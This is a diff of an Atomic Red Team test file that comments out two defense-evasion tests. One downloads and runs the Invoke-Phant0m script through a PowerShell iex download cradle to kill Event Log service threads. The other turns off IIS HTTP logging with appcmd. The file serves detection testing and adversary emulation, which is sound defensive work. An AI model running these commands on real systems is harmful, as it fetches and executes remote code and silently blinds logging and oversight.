@@ -130,41 +130,43 @@ atomic_tests:
       C:\AtomicRedTeam\tools\uninstall_sysmon.ps1
       C:\AtomicRedTeam\tools\install_sysmon.ps1
 
-- name: Unload Sysmon Filter Driver via Phant0m
-  uuid: d205e4c1-408b-484f-8ac4-7d4a6201bb1d
+#@todo reboot needeed
+# - name: Unload Sysmon Filter Driver via Phant0m
+#   uuid: d205e4c1-408b-484f-8ac4-7d4a6201bb1d
+#
+#   description: |
+#     Phant0m walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running.
+#   supported_platforms:
+#     - windows
+#   input_arguments:
+#     phant0m_url:
+#       description: Phant0m url
+#       type: string
+#       default: https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1
+#   executor:
+#     name: powershell
+#     command: |
+#       iex(New-Object System.Net.WebClient).DownloadString('#{phant0m_url}');
+#       Invoke-Phant0m
+#       #rollback
+#       C:\AtomicRedTeam\tools\uninstall_sysmon.ps1
+#       C:\AtomicRedTeam\tools\install_sysmon.ps1
 
-  description: |
-    Phant0m walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running.
-  supported_platforms:
-    - windows
-  input_arguments:
-    phant0m_url:
-      description: Phant0m url
-      type: string
-      default: https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1
-  executor:
-    name: powershell
-    command: |
-      iex(New-Object System.Net.WebClient).DownloadString('#{phant0m_url}');
-      Invoke-Phant0m
-      #rollback
-      C:\AtomicRedTeam\tools\uninstall_sysmon.ps1
-      C:\AtomicRedTeam\tools\install_sysmon.ps1
-
-- name: Disable Windows IIS HTTP Logging
-  uuid: 31aeec43-c659-4369-9439-3764a276e957
-
-  description: |
-    Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
-    This action requires HTTP logging configurations in IIS to be unlocked.
-  supported_platforms:
-    - windows
-  input_arguments:
-    website_name:
-      description: The name of the website on a server
-      type: string
-      default: Default Web Site
-  executor:
-    name: command_prompt
-    command: |
-      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
+#@todo ERROR ( message:Cannot find SITE object with identifier " Default". )
+# - name: Disable Windows IIS HTTP Logging
+#   uuid: 31aeec43-c659-4369-9439-3764a276e957
+#
+#   description: |
+#     Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
+#     This action requires HTTP logging configurations in IIS to be unlocked.
+#   supported_platforms:
+#     - windows
+#   input_arguments:
+#     website_name:
+#       description: The name of the website on a server
+#       type: string
+#       default: Default Web Site
+#   executor:
+#     name: command_prompt
+#     command: |
+#       C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
